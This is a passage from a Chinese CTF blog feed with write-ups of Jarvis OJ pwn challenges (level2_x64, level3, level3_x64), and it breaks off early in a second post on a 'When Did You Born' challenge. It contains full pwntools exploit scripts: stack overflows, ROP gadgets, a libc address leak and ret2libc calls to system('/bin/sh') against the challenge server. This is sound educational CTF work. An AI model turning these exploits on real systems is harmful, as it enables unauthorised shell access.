<p>载入IDA分析程序</p>
<p>因为和之前分析流程类似 所以直接看关键代码</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">ssize_t <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-80h]</span>

  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo Input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>漏洞存在于read函数 </p>
<p>这里虽然限制了read读入的长度 但是不会影响我们构造payload 因为理论上read函数是可以无限度</p>
<p>这里要注意x64下rbp到ret的偏移为0x8字节</p>
<p>还需要注意</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>从第一个到第六个依次保存在rdi，rsi，rdx，rcx，r8，r9。从第7个参数开始，接下来的所有参数都将通过栈传递
</code></pre><p>变址和指针寄存器RSI和RDI</p>
<p>传参是有顺序的  </p>
<p>所以这里 就是bin/sh 参数需要放在rdi里</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>计算偏移</p>
<p>0x80+0x8     //距离rsp 0x80 因为64位所以rsp与ret偏移为0x8</p>
<p>利用ROPgadget获取pop rdi </p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ ROPgadget --binary level2_x64 <span class="token operator">|</span><span class="token function">grep</span> rdi
0x00000000004006b3 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret
</code></pre>
<p>覆盖ret地址为gadget</p>
<p>pop rdi ; ret  即为将栈顶参数弹出并存入寄存器rdi，ret返回栈 </p>
<p> 接着在传入system函数调用即可</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment" spellcheck="true">#p = process('./level2_x64')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn2.jarvisoj.com'</span><span class="token punctuation">,</span><span class="token number">9882</span><span class="token punctuation">)</span>
sh <span class="token operator">=</span> <span class="token number">0x600A90</span>
pop_rdi<span class="token operator">=</span><span class="token number">0x4006b3</span>
sys<span class="token operator">=</span> <span class="token number">0x4004C0</span>
pop_rsi<span class="token operator">=</span><span class="token number">0x4006b1</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token operator">+</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>尝试运行 成功获得flag</p>
<p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/11.jpg" alt="11"></p>
<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec level3
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/level3'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre>
<p>载入ida分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Hello, World!\n"</span><span class="token punctuation">,</span> <span class="token number">0xEu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>main先调用了vulnerable_function() 接着调用write()输出 hello world</p>
<p>跟进vulnerable_function()看下</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">ssize_t <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-88h]</span>

  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Input:\n"</span><span class="token punctuation">,</span> <span class="token number">7u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>漏洞存在于read()函数 </p>
<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>由于程序本身没有提供system函数以及/bn/sh</p>
<p>但是提供了libc </p>
<p>所以我们可以通过libc来获取system函数地址和/bin/sh地址</p>
<p>但是由于开启地址随机化 所以我们需要获取system偏移和/bin/sh的偏移来计算真实地址</p>
<h4 id="查看当前使用libc"><a href="#查看当前使用libc" class="headerlink" title="查看当前使用libc"></a>查看当前使用libc</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ ldd level3
    linux-gate.so.1 <span class="token operator">=</span><span class="token operator">></span>  <span class="token punctuation">(</span>0xf7fa1000<span class="token punctuation">)</span>
    libc.so.6 <span class="token operator">=</span><span class="token operator">></span> /lib32/libc.so.6 <span class="token punctuation">(</span>0xf7dd1000<span class="token punctuation">)</span>
    /lib/ld-linux.so.2 <span class="token punctuation">(</span>0xf7fa3000<span class="token punctuation">)</span>
</code></pre>
<p>可以看到当前使用的是libc.so.6</p>
<h4 id="leak-addr思路"><a href="#leak-addr思路" class="headerlink" title="leak addr思路"></a>leak addr思路</h4><p>利用vulnerable_function()函数构造循环来leak出write函数真实地址</p>
<p>write函数需要三个参数  所以可以构造循环</p>
<p>通过溢出buf开始循环 传入的p32(4)就是指输出4字节</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib32/libc.so.6'</span><span class="token punctuation">)</span>
write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
fake <span class="token operator">=</span> <span class="token number">0x804844B</span> <span class="token operator">//</span>vulnerable_function<span class="token punctuation">(</span><span class="token punctuation">)</span>
leak <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>fake<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input:\n'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>
write <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>write<span class="token punctuation">)</span>
</code></pre>
<p>既然获得了write函数的真实地址</p>
<p>我们就可以来计算libc偏移 从而计算出真实system地址</p>
<p>接着再次溢出构造system(‘/bin/sh’)</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#context.log_level='debug'</span>
<span class="token comment" spellcheck="true">#p = process('./level3')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn2.jarvisoj.com'</span><span class="token punctuation">,</span><span class="token number">9879</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#libc=ELF('/lib32/libc.so.6')</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'libc-2.19.so'</span><span class="token punctuation">)</span>
write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
fake <span class="token operator">=</span> <span class="token number">0x804844B</span>
leak <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>fake<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input:\n'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>
write <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>write<span class="token punctuation">)</span>
write_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
system <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> system <span class="token operator">-</span> write_libc <span class="token operator">+</span> write
binsh_addr <span class="token operator">=</span> binsh <span class="token operator">-</span> write_libc <span class="token operator">+</span> write
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>这里的p32(0x1553155)为返回地址可以任意构造</p>
<p>尝试运行</p>
<p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/12.jpg" alt="12"></p>
<h3 id="level3-x64"><a href="#level3-x64" class="headerlink" title="level3_x64"></a>level3_x64</h3><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec level3_x64
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/level3_x64'</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
</code></pre>
<p>载入IDA分析</p>
<p>因为流程和level3一样只是编译为64位了</p>
<p>所以直接看关键函数</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">ssize_t <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-80h]</span>

  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Input:\n"</span><span class="token punctuation">,</span> <span class="token number">7uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>思路和上一题思路类似 需要leak write 计算system真实地址与bin/sh真实地址</p>
<p>不过程序是64位 需要注意</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>从第一个到第六个依次保存在rdi，rsi，rdx，rcx，r8，r9。从第7个参数开始，接下来的所有参数都将通过栈传递
</code></pre><p>而leak时  write函数的三个参数需要传入前三个寄存器</p>
<p>使用ROPgadget寻找gadget</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ ROPgadget --binary level3_x64 --only <span class="token string">"pop|ret"</span>
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x00000000004006ac <span class="token keyword">:</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x00000000004006ae <span class="token keyword">:</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x00000000004006b0 <span class="token keyword">:</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x00000000004006b2 <span class="token keyword">:</span> pop r15 <span class="token punctuation">;</span> ret
0x00000000004006ab <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x00000000004006af <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400550 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret
0x00000000004006b3 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret
0x00000000004006b1 <span class="token keyword">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x00000000004006ad <span class="token keyword">:</span> pop rsp <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400499 <span class="token keyword">:</span> ret

Unique gadgets found: 11
</code></pre>
<p>找到需要的</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">0x00000000004006b3 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret
0x00000000004006b1 <span class="token keyword">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
</code></pre>
<p>没找到第三个参数需要的寄存器 </p>
<p>尝试些不去限制读入长度写EXP</p>
<p>查看在调用函数之前rdx的值，如果rdx值&gt;=8，那么就不需要处理 </p>
<p>偏移计算</p>
<p>0x80+0x8</p>
<p>可以参考level2_x64</p>
<p>所以这里exp可以直接使用level3的exp并对leak处和bin/sh传参处进行修改</p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#context.log_level='debug'</span>
<span class="token comment" spellcheck="true">#p = process('./level3_x64')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn2.jarvisoj.com'</span><span class="token punctuation">,</span><span class="token number">9883</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./level3_x64'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#libc=ELF('/lib32/libc.so.6')</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'libc-2.19x64.so'</span><span class="token punctuation">)</span>
pop_rdi <span class="token operator">=</span> <span class="token number">0x4006b3</span>
pop_rsi <span class="token operator">=</span> <span class="token number">0x4006b1</span>
write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
fake <span class="token operator">=</span> <span class="token number">0x4005E6</span>
leak <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input:\n'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>
write <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>write<span class="token punctuation">)</span>
write_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
system <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> system <span class="token operator">-</span> write_libc <span class="token operator">+</span> write
binsh_addr <span class="token operator">=</span> binsh <span class="token operator">-</span> write_libc <span class="token operator">+</span> write
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>此处p64(1553155)为返回地址可以任意定义</p>
<p>尝试运行</p>
<p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/13.jpg" alt="13"></p>
<p>成功拿到flag</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;此篇记录关于Jarvis OJ Pwn所有题目的writeup&lt;/p&gt;
&lt;h2 id=&quot;XMAN-level0&quot;&gt;&lt;a href=&quot;#XMAN-level0&quot; class=&quot;headerlink&quot; title=&quot;[XMAN]level0&quot;&gt;&lt;/a&gt;[XMAN]level0&lt;/h2&gt;&lt;h4 id=&quot;进行chack&quot;&gt;&lt;a href=&quot;#进行chack&quot; class=&quot;headerlink&quot; title=&quot;进行chack&quot;&gt;&lt;/a&gt;进行chack&lt;/h4&gt;&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;bash&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_position=&quot;outer&quot; data-labels_left=&quot;&quot; data-labels_right=&quot;&quot; data-labels_copy=&quot;&quot;&gt;&lt;span class=&quot;code-caption-label&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;[*] &amp;#39;/home/ios/Desktop/pwn0&amp;#39;
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
    
      <category term="Jarvis OJ" scheme="http://iosmosis.github.io/tags/Jarvis-OJ/"/>
    
      <category term="栈溢出" scheme="http://iosmosis.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>When Did You Born</title>
    <link href="http://iosmosis.github.io/2018/03/21/When-Did-You-Born/"/>
    <id>http://iosmosis.github.io/2018/03/21/When-Did-You-Born/</id>
    <published>2018-03-21T02:49:50.000Z</published>
    <updated>2018-03-21T03:25:20.219Z</updated>
    
    <content type="html"><![CDATA[<p>南邮CTF的一道简单pwn100题目</p>
<p><img src="/2018/03/21/When-Did-You-Born/1.jpg" alt="题目信息"></p>
<ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文=""><h4 id="题目提供了源文件-可以看下代码了解流程"><a href="#题目提供了源文件-可以看下代码了解流程" class="headerlink" title="题目提供了源文件 可以看下代码了解流程"></a>题目提供了源文件 可以看下代码了解流程</h4></the></li>
</ul>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">struct</span> Student <span class="token punctuation">{</span>
    <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> birth<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">struct</span> Student student<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What\'s Your Birth?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>student<span class="token punctuation">.</span>birth<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>student<span class="token punctuation">.</span>birth <span class="token operator">==</span> <span class="token number">1926</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
